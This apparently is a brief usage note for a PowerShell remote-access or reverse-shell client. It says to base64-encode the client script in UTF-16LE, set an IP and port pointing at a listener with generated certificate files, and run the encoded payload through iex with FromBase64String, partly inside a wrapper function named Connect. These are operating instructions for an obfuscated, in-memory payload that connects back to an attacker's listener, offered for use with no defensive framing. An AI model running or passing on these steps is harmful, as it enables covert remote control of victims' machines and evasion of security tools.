Use Client.ps by encoding it with https://www.base64encode.org/ use UTF16-LE and CRLF(Windows) Make change in ip and port in code keep genrated cert files in same directory where listener is present.
To execute the encoded code use iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('Base64EncodedCode')))
To execute the encoded code use function Connect{param([Alias('e','EncodedCommand')][string]$Via);iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Via)))};Connect -Via Base64Code
